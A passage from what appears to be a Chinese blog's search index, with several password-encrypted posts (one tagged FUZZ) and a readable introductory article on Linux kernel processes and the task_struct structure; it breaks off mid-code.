30704f88ce46b21210ad96f5c62d2376a0750a93f90c5cf7c130d7735b987f79b05a44f2e3c92ca2620513d2dcce53b198bc3eca64b529e4e5b8fd3ed3738e073028d28ef8191d04f32201dccc405cc9763a812da95f783245e45f46b850044249ec60ecba937447fee6759a1ee28fe5243d8793613939afe7dd3ccba72a1918c73ae276f2707a00cdf7ecfefd83118e5fb8fa42af96820bddef31ba672ce7680b2c798d6f28d32b85e4ec5a071ac79cc61d0410f78afd5575943025393825dfad7d493bf8afc23ef608c2c77de0c7863b5d0cf42c40b3b441cf8be29509989c89e9b987cf4526b05700adfac5d96c6321ab9250e00d566554810d06439eb05e147ff5afe0751513bfb49bc40341cc85c9095673a094e694855bbe5b7c9a966effa945e8a447181f1ed7b0fa19ac1ad60a059298006cc1751baa386496e1d073bd3727f572c1d6477d5baa9397d83fc7acf89e25cfc484a6c79181c03cee2885463b0654ffdf0cb7abd9bd3a49721c6c20efcc67a332dd72528ad91afc57c878494962d4c2c47fde1e99b60e20066c37d37f4facb868ff9ac6a4b81a16ae4140b06f183b45c38a0dd2e64516c1d3b0fa866e8a7f0c4964126a2f67e5182d9d4147b2f4e39965f4d66dddafe9d48912faa34e5d9db4e9f88d49e4505d348f18c8d5294bcc581868e6934520fa1a78a6c784f6279e7eca06e2a9b672d89b51b90da7c7758330fa159834f9a3d78102ccd8c132ea551cbd313ddc008db9921bfebe0fda26063360f99038a8e604aeabf04fc061e71f8766e7887852ba28ceb991c1d8fd8ac5478c5cfcb4dc4fc9e2b5ef2ca4ab1cd0f4f8ff4fddf0981ebffd84a9fb3279e87c59fdfb1042e2281e31cc0dcbff59aff885b6ea3d6aed8bbb052f4d4912aa68ec1278a5391dd9d83a55a7c818bae74afd5d5238debebe417db4e3fb3d4e474d8b5ab1a8ae6f4cccf6fa86d3b75177d34df3442e136a148fcbf97a0a1efa41f764e277388747c6da4d806e7c1d113a60913ebd173d89c7b1b7b24650329c0e4cf550609897976046f5c6341b2ae18eea8a2a5bf18c5d8c5ab47f75cc44630760d588fe26aede961032a34f77375608946c18bd3000a84afb3ed6422d4c78ea78d6a0bc99175c75dd82eac519d6e38c7ae2147e38a7eac5fbcf89b6ccef8f3031d62fd94bfe7df173752085eb2f6312846e1e39f0516534dea20d0e063791ba0ee150a2a8d728f8640f75856631c49f590d4699444986c13160761ffad6e29265cfe0e8e83cc188420c79a773202bd9f3ba105a663782313ee92b9e6c0d0334952e5bb0e87b1c35286269534ed24d302f2f3ea4f25609b38e9436131dcd61ea2c44181758480cc49e0424c4188608a5399f107c1c31157b9b5a106fc2177a1a33450ede19a513f3ec56625e1abbee14ea66bfff97080fee5cf38c7eff43ac9f60c49bb4ed429899053b1b0158f696a67c425515c4399e67e90ac9a24d632d0ceb26eb1e7e9aa070f7f7c3eb0eb0169e7f19c8d89322328f8f78e6a850dab65d7186d80f33a48386125fc5c39db64269de94d1e088ecdfbfc5b2d01ce378c47193c1d0f6b825dc6e37978fd54b9da217104dd2d3ebdd3927930ee7acc10d0741efe2d16c83ba1405b0dec2d07879ce4bc20e9c4777908950fb4fffd35e02720a6804f52464ab537c49d9de547d707d36969df8988c7ede7d8f3724d7ff1991c16373811d786954ce1ef64104d81fe6d4ec467861c9554d8b6e83e368456b1a0946fbcf8de9c554972381111ba78ce55be25a1bf28edb5ce90fdd133582894c0406a87f64d0844e9d2794c5729d1cb254a6a99f685b8730fcadbc1a26b991e055ce9f39d2cd431ac711b15a46512d6283aab8224f84f91b6947f67681c3101826f324835e8773b1c870ece9ac4a5a6624ee20b1b5114bdbb16326c6648ac9be1df7122b06bf3780a15d681818c1af973472d32e1cce73e7e5efd2767711c30983ea57977f077c90f0e1842533c26aaf99880d6f0b24b66411ef201908c044c5c441f74c6bc38d0b228067a032c698ae0e0a75a1794925556c29eeaa1f798b4006370faa9d42b324369d72efbac1c43bd709aa29817c131705f5e74b5b6d52caab01a787f1c6b0d18d5bb660d6789f5a57446fc4ab1e41944708206d18899cd5a127312c298410249efd693e1534c23e1270ea7647d8e9891c4027f78b2c4047776edd2134cc7e6fe26ced1f1931272c78d814d345c400267127f9a24edc7491f260a28d39b7da328e553378054f5f1d80606d0a7bcd7fff46bcd8d964d9cb77d2d78e8c09c76855aa561e3775d9c4de9c6c9a9fc7520c65a711126f2d04badfb321af9b3fa77b9bdff0e7b8b7e158b46290ef3d161b29631f3feef3d96ff00dee5b589f1c03a869146b369f3fcbb3c90c339e6715104fbe23fe7fa2904a0236ffa647f8941614a6084a05c4d249c646acb1bfd08c3ae93eaa1221894a4230eb3b42a13fd71be9cf39fa364ac48c465e2d730991197f2bfea978fa3a8aaa736d3b77f0f4a8942e722f600e1f89c6392d22466f466d35fc66c0e39c1610d4247470f5f9777550425215cf18611c60308f649fe3a4cfc771ddff624936e8f48ecc75429965210b8e18c81ad3ba9af29ed9cd5cea7da6d7b25c0825d472c482b9af96296b17178f354fb793387a72c11ea56b12a70bd8c16af6225e07e9c625cd3e2e31ba80c8990145252c90c471f70a9eb688b1e52e359d84b08cff44e64611e2e42c9a9e86edd12faba02ce663809078bfbe5fab5d14dfa9388a05060a6852bfe88a0bf0b21a4c6f9d0a5502d326d89811d5b79af88efa1f6b789f9fac8a83dda5eead37a09098b86ce2710b4433e0a3da33020c012b2b77512420004fc745ebfc20a986aeee98805cf6f1863bfc5512b44c57ee6cc49ef4856ead6c7b62dab5b74279b12aa6a8b8f6d4f9c5cbb8e27ada2ab3f16473fc9c788a0d4133750d7fa18331c35dd38071401129eea02b78cf94e4cabafb2a966c607021ee99e7f320af678ca396667ea7d0ff51ea4510ca0033cb4bc7d67f4d0eb626aa77946a7ef27978eaaaf558701b29d5072b5ebbec1bc124ea44514ddf8e711b466ebca316258d1fe41827951491ea115f63afda20341ebce6236786f9c5113c23f6fd72cb98a3475ceca89f0395dc588dfc1824a569f93e2bb456ca7dda060bdad9c70eddd68ba0225645deb42bb13f58630a6ec120f1ec839425797a305caab229683609f0f0c4b9ec3048404a5efc97928761893eba4a835e62b579c855e57eed0dec28ab5302f1635e9632ca43264f1fee0179323d0fcec16b338afe90f6e95faae6bff2ea8bc979b8b04f044023b35551dcc823733ac627dca1f824c97ecf3b6a49277df371ae981ad3fa3abdfd2af335a9fa93522c5a21e40d38c7a8aa5f13232f20b0ba77e2896e69ca5b716210d54f3201ae63ce1bbdf3b4b4d90be514782867f0a9fbb48bdb96e056494d242d753ea8ef76fc5f3e9bdfb80a74f3ee18871a39cfdedd155f66092d27d68ab2f041614572948ed91a8860c5284079e591195d55c439595a4ffaa21cf7e52ab810e4ea6696d4eeb8bd8044b1ec845a2a3302b7f6a6200dc5c8ba3d601252c0227d70fa1c5c1b2d55d5d4d1b5f1acb130ade1e196ce28a74e2a3273eb81b4fb2b524764b9577f495c866269f17bde462ad7befbd0b426c203fd154b628ed252b589399033e51783bb0f7ff3d41188e95d9f3b95315958f6929bae51445db99e16349b53f9a7eb5d2b8e380e19f133847b133fcab4c2bb622f9a1533e998f32ff5d593c0c636e85f9b5c9f25af1c0d9cf759876cf66f2a2051ed1cc274b9cdb477c2dd4700cf71a250f2088a637b85157c1c8b951059ed94e859173d180175a7fff7191d1bab46a0fbbefcc6aa6427c8d77c99f067376b60b4318db61f0c167a4b458dff60cc7b0e0e4dc0ec0f604949d2cdc702809756ee9d7ee00a0b5272af84a319f6a5fa9737f5d92ebaea38271f411738b648068b3bc9fe57d7095f5a9bdbbd1f37243c8a1246c5eee1bd167d2297f00450f96fdc0d70d88c4127dfcba9dedd233651af23ec8a42915e2575293ab545ca8ace48ea4b6f70bf1ead57874713904919fbc946973e4c47cded61786f49a0d98d005ddf961df5833dea447e4055d86552cdfce4cc7d14a046b8d8b86731def0302ba3ed2d74613e802205cb885e4afcc58c6a45e297b31ae91031dbd6ac7825192a18b9a0e8ec84011dd3864ec2230c928ea780437ceca51e7f6db315f8766a79d7b10e6132afc1abbf027c975d2f94b64ecc7d83a8fe3ae52fedd66de6fdaf0c9f270d24bfea8421f681333f75a788b6897071d35ff8a1086f6e34b362a436f8d935c5f418d2b4f080469a513f095067027fb44180522758d16d1f7512d2b652351db7ab676b74449ba1a6de9ff927d32c7aeddcafdc10855769113cc1d89079ab6560b8b76d1d357f8a9a8c1902898c1ada7fdb9426fe400464f84f4e803e256b9d9c46c0c64f6ad9a900d91aae0b90d1d7bf7a7d6cd48782d93a67a20b164fac88db617eb5f0ef765d4886cf814cb41486997e17caa4247e19117db27bfdf5fd92f078709ef31e6cd79630903dd7e1edfde75c7255257ae38a1001f680ec4127d509966e71470bb792f1fa84b815c119a2f599de6d78c517c3a947a9239676b6b278fcd84453d14b9aa3e492d0b48ec5cb2b0e2b243ea3798351e1980516843353de7d0bf83467f8bc0024be66f2bf407ef4b8efbbbef17637c2550660694bedf0171ea79213553d921454550a64958555f7437b5af960332bba0eb23e7b037fa407aea013878afcf532eca4b87924e8bb0c481b3b47fb6be87de7065c122bbdaa08ec3ededa8764d014caf1691ac302cd192f0c823e2959261f47c486b76c77c48db4b3b4094f6a9ce1bf503b0c51b8b59bd46e3fc907bfb7611ebd89efe0d14022154d56f267104b205f240f20750f546737d2752dcf8279b2aea4df04a86401eb32b0231450d123f9afba11152ef087543e00646fb05cd91e22a38616d3a9a2833e1a86fc2dedcab659f46c5f8c574b2bbb51da2830ce27eb215b23e84445acef8fe0dc26698cca9dc25de6ba8e5d8a30b3c87b5de1a1581e681cb3e2284b75d5cf741b65b7a38733563d5436f3739ad305c7c61845f11a56bcb0e06a96edb0f8c3a293c528ad2ad042924cc8626d9764e9dc0a602b04c813bfd4c427ed360c48ed1e985f468c5e9fc88f8e203362bc849cd7529b87a5103a862d271880b020a45eb5c0ce5bb511fadd54b37dbe6083c1b0ebd4ec9bf3a2fb7c526e4d725edac9c8a5248598d6deb77b72f4aeca420de96bfc5a448b49166ee7393c92cb139bc4643c0a9565270b2dd072d15367895d8746aa8dc3762265199bcf6644d4e7b1fd5928b483cdc1b71cc62a7f03e7ab8b423149a4e64da55af94b56807985d44a1cf700ee13788376bd99c00e43b182099e71fa0ce631bc98ea1a7293179c34b9275190cf5afed95f613e5e0dd03e98cc34d9e4e55e71cc65d53026bdbb5b52ad788302bc5f7d931568a9be59fe6a8a61fb18fe7ac14028636db7c8e0c5b6e2f4b23b69dad077c2f809a4b853dd0842f0eda006480453151f063e96a69eeb8f4bdbfcadb5f3be11acd3cef2714e00baa6c01d495b8f052e9697c3680f21555e64451983b4555106583b2e78cb88b185c7eff37a222bf872ddae9d89e0b429ada95762abbcac2c0742074cf9adcf77802331d2b99822f05371d271b0daf67a0f7c7b5ddd85001fb87f3a9a3643ccd4e42e8f3bcb97af911470e0893af761c65c37c813e7232301f50cf8ec1ddf7901369cce1619b4df09bd0f8beff8fc2c160e93afc11a7db8ae1a16b4b48e66fa1d895dbee68be4d4000bd9d398e64b2ae4f9ee5f5f03bbbdf81cf58b2f7b9008a3cf1aefce1489ea1ebce1aef951325ba04bc16fd66d95597a66b7dd44305adbcce14af37e8fa32b26daeb699e3778af4093584a9aabb3cee285099113040592f162e723f1363b31837a3e44c718ed126b5483c4782aaffe3ffed5ee0f04970f13c5673134373faa46237e1c02900b44d2df2ac96822f20cc29d4fff2bfb33a4da5d0b7d6cd6f26c91c739916bb69c54418b151c033639b6c7cfebc406c8277aeecc75aec6860e104ae9b759dfadca259512bef68e340a61eacfc54f607239226b6ccdcdaacc97d118cd5c71c352e7ddaf71055009cc9623009e9b629d508d857f27005d3f396eea35a6cd39459f94967d8a1d3d96e4364a0a728f04990daf9b700d6c56c00d7e48ae3fc98bb1f5df893e14f7e79f9477530ae30f9354f095258fe585e0b1f77224ad001eaaa72e4f5f956c5cf7b2598b5ae3d3623581fdb2d541fc0f111c4bbea9eb331128578fa004d21eee0339551b4fd8d3b77617cad9c6aab203ce056aa640d91d2ed1e3e20804ff6ecd6c10cfbe14a2255780f77881309874812003cb85efc1e4b4609a10593aa54098bc996575dcf18e4cb800806dc6423dbf18c5ce3d6b39ce2072befcb25ded20055c01352c31d63fc6146267cdc379c1e3bccc8346a716337e41dd0adec25c496e6f5b40b7a9cbddf40c172fc5dd12fb3c80de9d15d98c6a323edab0949d33939741cee2dba2e9c0e8697016c8d28d42f6ef1af151291de55c0fe3f1733abf94a4f732801ce8e4454b535326bb4a4fe07e5a5703086e857284c88494c587a0553d8826d79c2de63b19bb98b86e698252abf4f87569c83359d1d2ea816b846635d2261a3275e2b6e68b89dc1ecc283d2a1c0d4271697a0bbf14497d672588dfecf715a7f8493db447fc5c5aca0695ddb1ffaad4f5e509a60df1e0550fdb45172b2a6cd1a18b37fc079e9939d437438d5f54087d5cb46c3374b46bed58daf39d259cc72fdffd470880f82b5d6ebd5b77edb8fd410db15eac521ce7b4f3e2252e76916745a96406b1304e0210a5f1146aa3bc2492bb39c05a4528dfcd4cb8b5af77094502fb5fb5eb1d3c5ac12a7a6019d772f93cfd6c5ad891feb0c1da74a94faef1c5affca77dfb2bd9283c11df4fb4d0356e9960b77d3a51bd77ea5c6f9e41283d087c5e2c517aa5164ca3a7935e9e5808a172e4dbd75ecd0db101bf928c2d686e01a91acbbb9a6d541b24dfc21a851d50e96d897deabf812f1486b970df936edc01421ac6758242d55a8ed161905bebfae7afaea2fc5ddff2c2fee43bb33c9c8427dbdc26921d3da22c89cc7c1efc541a73cfb75c657bac60fde6fe7d3e4817814cb4eea7bd993e3311997742b17b1fb30b3b49a323931fa9ac63cdc7c1b924952affefb05442dc27b9eac62d42351c2f1615d7d4426c8bb0957185c6557e05a09c60e2929500c21c64521ae589e41b3bbc5745b5b60701c495202692e778dd0655f723398ae56170afc3ba115d18ba0da3805f63c42fc2b1fcf4be7afb29eb55ad43f0843a83ad3565058861f679b0254050b4dc2d61a55fe60b4e791a798cb665b9fdcdc9bceeae277aec06afa127c947a2eafc6b872196f33199feae51ad7693dcdd8479cb480950476d365e7c170adba6b2e61d86542e5029b00901988d186d0a73426d37b91df6d187137925a972631a66b9f7c0f5e70b9c35890c791beb74395b338ca68adedcf963df8c93a7f5f10d67371e738138c626fb7a038da55499dbf3d83b8b25b978a4335dc5662a11d39177245c4597daedbf1047a5d4587cb8c05c0166bc881b8594d58a715da35b448b1d9d739a774dfe4236fabefcd455f862b812c605df44ff3ce6df4471e9c91b5efbb6f83c70c5edd9dac8803dfd1191a39d7a0f5799005090d089f5c928889be0d63ab2dc62e6ff81b0d9fe17426cda88e582d9d197faf956f13a47cab6cb2a4d1c229101c16571a592d885885550782121142784a1105a91be4b44c6522e170945d6d67c51ac3dd301217488517f346afb5515ab8f2957b1562c2d6c7807fe045cb3d61fd5198f72669c4f177bc97ae94821aff4525b765e3adeebf3ae0954f300ed19dcb24d9530a9fd9fe031907c65020cee6ce261a3b01808ebb9ace9ec51523d6ac5ca9cab311fc8b074af57da4bed80a1ee758663862f737bac8e0c56119f2b1ce9af409790473b436333bce171168300bfe4278eb7e2de2</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>FUZZ</category>
      </categories>
      <tags>
        <tag>FUZZ</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析Linux内核之进程</title>
    <url>/2024/02/01/%E6%B5%85%E6%9E%90Linux%E5%86%85%E6%A0%B8%E4%B9%8B%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>Linux_kernel进程</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统第一部分虚拟化</title>
    <url>/2024/01/31/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E8%99%9A%E6%8B%9F%E5%8C%96/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c2fdd8cc3d7b7389fc8fb8749280751776d7de493fecfd2e1f605f8ac3c6442e"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统虚拟化</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核分析之进程</title>
    <url>/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="进程原理及系统调用"><a href="#进程原理及系统调用" class="headerlink" title="进程原理及系统调用"></a>进程原理及系统调用</h1><p><a class="link"   href="https://zhuanlan.zhihu.com/p/112203100#:~:text=%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E8%AE%A9%E4%BD%A0%E4%BA%86%E8%A7%A3Linux%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E5%99%A8%201%201%E3%80%81%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86%201.1%20%E4%BB%80%E4%B9%88%E6%98%AF%E8%B0%83%E5%BA%A6%E5%99%A8%20%E9%80%9A%E5%B8%B8%E6%9D%A5%E8%AF%B4%EF%BC%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%98%AF%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%92%8C%E5%8F%AF%E7%94%A8%E8%B5%84%E6%BA%90%E4%B9%8B%E9%97%B4%E7%9A%84%E5%AA%92%E4%BB%8B%E3%80%82%20%E5%85%B8%E5%9E%8B%E7%9A%84%E8%B5%84%E6%BA%90%E6%9C%89%E5%86%85%E5%AD%98%E5%92%8C%E7%89%A9%E7%90%86%E8%AE%BE%E5%A4%87%E3%80%82%20...,%281%29O%20%281%29%E8%B0%83%E5%BA%A6%E5%99%A8%20...%204%204%E3%80%81Linux%E7%9A%84%E8%B0%83%E5%BA%A6%E5%99%A8%E8%AE%BE%E8%AE%A1%204.1%20linux%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E5%99%A8%E7%9A%84%E6%A1%86%E6%9E%B6%20" >参考链接-Linux中国 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="进程四要素"><a href="#进程四要素" class="headerlink" title="进程四要素"></a>进程四要素</h2><ul>
<li>要有一段程序供该进程运行</li>
<li>进程专用的系统堆栈空间</li>
<li>进程控制块 (PCB)，具体实现是task_struct结构</li>
<li>有独立的存储空间</li>
</ul>
<p>只具备前三点可称之为线程，完全没有用户地址空间的被称为内核线程，共享用户地址空间的被称为用户线程。</p>
<p>进程一般分为两大类：实时进程和普通进程。实时进程与普通进程的根本不同之处：如果系统中有一个实时进程且可运行，那么调度器总是会选择它，除非另有一个优先级更高的实时进程。</p>
<h3 id="内核线程"><a href="#内核线程" class="headerlink" title="内核线程"></a>内核线程</h3><p>内核线程是直接由内核本身启动的进程。内核线程实际上是将内核函数委托给独立的进程，与系统中其他进程“并行”执行（实际上，也并行于内核自身的执行）。内核线程经常称之为（内核）守护进程（Daemon）。它们用于执行下列任务。</p>
<ul>
<li>周期性地将修改的内存页与页来源块设备同步（例如，使用mmap的文件映射）。</li>
<li>如果内存页很少使用，则写入交换区。</li>
<li>管理延时动作（deferred action）。</li>
<li>实现文件系统的事务日志。</li>
</ul>
<h2 id="Linux内核提供的进程API"><a href="#Linux内核提供的进程API" class="headerlink" title="Linux内核提供的进程API"></a>Linux内核提供的进程API</h2><p>其定义在<a class="link"   href="https://elixir.bootlin.com/linux/v5.6.14/source/include/linux/sched.h#L76" >&#x2F;include&#x2F;linux&#x2F;sched.h <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中，下面介绍几个常用的：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_RUNNING				0x0000 <span class="comment">// 可运行或可就绪状态。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_INTERRUPTIBLE			0x0001 <span class="comment">// 浅睡眠，可中断睡眠状态。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_UNINTERRUPTIBLE		0x0002 <span class="comment">// 深睡眠，不可中断睡眠状态</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TASK_STOPPED				0x0004 <span class="comment">// 终止状态</span></span></span><br><span class="line">define EXIT_ZOMBIE					<span class="number">0x0020</span> <span class="comment">// 僵尸状态</span></span><br></pre></td></tr></table></figure></div>

<h2 id="task-struct-结构体分析"><a href="#task-struct-结构体分析" class="headerlink" title="task_struct 结构体分析"></a>task_struct 结构体分析</h2><p><code>task_struct</code> 为进程描述符，Linux内核涉及进程和程序的所有算法都离不开这个结构体，源码在<a class="link"   href="https://elixir.bootlin.com/linux/v5.6.14/source/include/linux/sched.h#L629" >&#x2F;include&#x2F;linux&#x2F;sched.h <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，其内容过多，这里挑核心成员进行讲解：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For reasons of header soup (see current_thread_info()), this</span></span><br><span class="line"><span class="comment">	 * must be the first element of task_struct.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span>		<span class="title">thread_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* 就绪态: -1, 运行态: 0, 终止态: &gt;0 */</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">long</span>			state;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This begins the randomizable portion of task_struct. Only</span></span><br><span class="line"><span class="comment">	 * scheduling-critical items should be added above here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	randomized_struct_fields_start</span><br><span class="line">	<span class="comment">/* 指向内核栈 */</span></span><br><span class="line">	<span class="type">void</span>				*<span class="built_in">stack</span>;</span><br><span class="line">    <span class="comment">/* 有几个进程在使用此结构体 */</span></span><br><span class="line">	<span class="type">refcount_t</span>			usage;</span><br><span class="line">	<span class="comment">/* 标记 Per task flags (PF_*), defined further below: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			flags;</span><br><span class="line">    <span class="comment">/* ptrace系统调用, 常被用于追踪调试 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			ptrace;</span><br><span class="line"><span class="comment">// 条件编译，多处理器用到</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>		<span class="title">wake_entry</span>;</span></span><br><span class="line">	<span class="type">int</span>				on_cpu;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	<span class="comment">/* Current CPU: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			cpu;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			wakee_flips;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			wakee_flip_decay_ts;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>		*<span class="title">last_wakee</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * recent_used_cpu is initially set as the last CPU used by a task</span></span><br><span class="line"><span class="comment">	 * that wakes affine another task. Waker/wakee relationships can</span></span><br><span class="line"><span class="comment">	 * push tasks around a CPU where each wakeup moves to the next one.</span></span><br><span class="line"><span class="comment">	 * Tracking a recently used CPU allows a quick search for a recently</span></span><br><span class="line"><span class="comment">	 * used CPU that may be idle.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span>				recent_used_cpu;</span><br><span class="line">	<span class="type">int</span>				wake_cpu;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* 运行队列 */</span></span><br><span class="line">	<span class="type">int</span>				on_rq;</span><br><span class="line">	<span class="comment">/* 进程调度策略和优先级 */</span></span><br><span class="line">	<span class="type">int</span>				prio; 				 <span class="comment">// 调度优先级</span></span><br><span class="line">	<span class="type">int</span>				static_prio; 		 <span class="comment">// 静态优先级</span></span><br><span class="line">	<span class="type">int</span>				normal_prio; 		 <span class="comment">// 正常优先级</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			rt_priority; <span class="comment">// 实时优先级</span></span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span>	*<span class="title">sched_class</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span>		<span class="title">se</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_rt_entity</span>		<span class="title">rt</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CGROUP_SCHED</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_group</span>		*<span class="title">sched_task_group</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_dl_entity</span>		<span class="title">dl</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_UCLAMP_TASK</span></span><br><span class="line">	<span class="comment">/* Clamp values requested for a scheduling entity */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uclamp_se</span>		<span class="title">uclamp_req</span>[<span class="title">UCLAMP_CNT</span>];</span></span><br><span class="line">	<span class="comment">/* Effective clamp values used for a scheduling entity */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uclamp_se</span>		<span class="title">uclamp</span>[<span class="title">UCLAMP_CNT</span>];</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PREEMPT_NOTIFIERS</span></span><br><span class="line">	<span class="comment">/* List of struct preempt_notifier: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>		<span class="title">preempt_notifiers</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_BLK_DEV_IO_TRACE</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			btrace_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// 进程调试策略相关字段</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			policy;</span><br><span class="line">	<span class="type">int</span>				nr_cpus_allowed;</span><br><span class="line">	<span class="type">const</span> <span class="type">cpumask_t</span>			*cpus_ptr; <span class="comment">// 允许进程在哪个cpu运行</span></span><br><span class="line">	<span class="type">cpumask_t</span>			cpus_mask;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PREEMPT_RCU</span></span><br><span class="line">	<span class="type">int</span>				rcu_read_lock_nesting;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">rcu_special</span>		<span class="title">rcu_read_unlock_special</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">rcu_node_entry</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_node</span>			*<span 